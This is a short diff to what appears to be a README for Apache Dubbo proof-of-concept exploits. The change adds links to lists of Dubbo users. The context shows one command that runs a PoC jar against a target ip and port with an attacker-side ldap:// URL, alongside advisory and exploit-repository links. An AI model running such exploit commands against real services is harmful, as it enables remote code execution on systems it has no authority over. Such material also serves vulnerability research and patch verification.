@@ -25,3 +25,5 @@ java -jar Dubbo-PoC-Spring-2.7.7.jar ip port ldap://ip:port/test
 - https://securitylab.github.com/advisories/GHSL-2021-094-096-apache-dubbo/
 - https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/
 - https://github.com/threedr3am/dubbo-exp
+- [谁在使用 Dubbo](https://github.com/apache/dubbo/issues/1012)
+- [谁在使用 Dubbo3](https://github.com/apache/dubbo/issues/9436)
